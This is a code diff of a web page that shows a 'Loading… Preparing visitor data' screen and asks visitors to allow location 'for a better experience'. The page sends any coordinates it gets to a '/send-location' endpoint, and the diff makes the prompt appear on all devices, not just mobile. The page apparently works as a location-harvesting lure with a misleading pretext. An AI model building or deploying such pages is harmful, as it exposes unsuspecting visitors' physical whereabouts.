@@ -18,19 +18,20 @@
 </div>
 <h1 class="loading-title">Loading<span class="dots"></span></h1>
 <p class="loading-subtitle">Preparing visitor data</p>
-<div class="mobile-prompt" id="mobilePrompt" hidden>
-<p class="prompt-copy">Allow location on your phone for a better experience on the website.</p>
-<button class="prompt-button" id="allowLocationButton" type="button">Allow Location</button>
+<div class="permission-prompt" id="permissionPrompt">
+<p class="prompt-eyebrow">Location Access</p>
+<p class="prompt-copy">Allow location this time for a better experience on the website.</p>
+<div class="prompt-actions">
+<button class="prompt-button" id="allowLocationButton" type="button">Allow This Time</button>
+<button class="prompt-secondary" id="skipLocationButton" type="button">Not Now</button>
+</div>
 </div>
 </div>
 
 <script>
-const mobilePrompt=document.getElementById("mobilePrompt")
+const permissionPrompt=document.getElementById("permissionPrompt")
 const allowLocationButton=document.getElementById("allowLocationButton")
-
-function isMobileDevice(){
-return /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent)
-}
+const skipLocationButton=document.getElementById("skipLocationButton")
 
 async function sendVisitorData(payload){
 await fetch("/send-location",{
@@ -44,43 +45,45 @@ body:JSON.stringify(payload)
 
 async function requestVisitorLocation(){
 if(!navigator.geolocation){
+hidePermissionPrompt()
 await sendVisitorData({})
 return
 }
 
 navigator.geolocation.getCurrentPosition(async position=>{
-hideMobilePrompt()
+hidePermissionPrompt()
 await sendVisitorData({
 latitude:position.coords.latitude,
 longitude:position.coords.longitude
 })
 },async()=>{
-hideMobilePrompt()
+hidePermissionPrompt()
 await sendVisitorData({})
 })
 }
 
-function showMobilePrompt(){
-mobilePrompt.hidden=false
+function showPermissionPrompt(){
+permissionPrompt.hidden=false
 }
 
-function hideMobilePrompt(){
-mobilePrompt.hidden=true
+function hidePermissionPrompt(){
+permissionPrompt.hidden=true
 }
 
 async function startVisitorFlow(){
-if(isMobileDevice()){
-showMobilePrompt()
-return
-}
-
-await requestVisitorLocation()
+showPermissionPrompt()
 }
 
 allowLocationButton.addEventListener("click",async()=>{
 allowLocationButton.disabled=true
+skipLocationButton.disabled=true
 allowLocationButton.textContent="Requesting..."
 await requestVisitorLocation()
+})
+
+skipLocationButton.addEventListener("click",async()=>{
+hidePermissionPrompt()
+await sendVisitorData({})
 })
 
 startVisitorFlow()
